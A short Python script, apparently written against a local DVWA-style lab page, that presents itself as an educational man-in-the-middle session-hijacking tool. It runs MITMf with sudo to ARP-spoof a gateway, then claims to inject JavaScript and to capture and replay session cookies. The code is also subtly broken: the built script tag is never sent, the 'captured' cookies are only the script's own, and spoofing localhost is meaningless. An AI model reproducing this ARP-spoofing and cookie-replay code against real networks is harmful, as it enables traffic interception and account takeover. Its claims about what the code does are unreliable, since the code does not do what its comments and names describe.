# Man-in-the-Middle (MitM) Attacks
# Description: This script implements session hijacking using Python with the help of MITMf (Man-In-The-Middle framework). The purpose of this code is educational and it's targetted towards the URL http://127.0.0.1/vulnerabilities/xss_d/

import requests
import subprocess

class MitM_Attack:

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def launch_mitm(self):
        # Replace 'eth0' with your interface name if necessary
        subprocess.run(['sudo', 'mitmf', '--arp', '--spoof', '--gateway', 'your_gateway_ip', '--target', '127.0.0.1'])
        
    def inject_js(self, js_code):
        script = '<script>{}</script>'.format(js_code)
        data = {
            'default_input': 'Message from MITM',
            'Submit': 'Submit'
        }
        res = self.session.post(self.target_url, data=data)
        return res.text

    def capture_session(self):
        cookies = self.session.cookies.get_dict()
        response = self.session.get(self.target_url, cookies=cookies)
        return response.text, cookies

    def replay_session(self, cookies):
        self.session.cookies.update(cookies)
        response = self.session.get(self.target_url)
        return response.text

def main():
    target_url = 'http://127.0.0.1/vulnerabilities/xss_d/'
    mitm = MitM_Attack(target_url)
    
    print("Launching MitM Attack...")
    mitm.launch_mitm()
    
    # Example of injecting JavaScript
    js_code = 'alert("Hacked!");'
    response = mitm.inject_js(js_code)
    print("Injected JS response:", response)
    
    # Example of capturing session cookies
    captured_data, cookies = mitm.capture_session()
    print("Captured Data: ", captured_data)
    print("Captured Cookies: ", cookies)

    # Example of replaying session with captured cookies
    replayed_result = mitm.replay_session(cookies)
    print("Replayed Session Result: ", replayed_result)

if __name__ == "__main__":
    main()
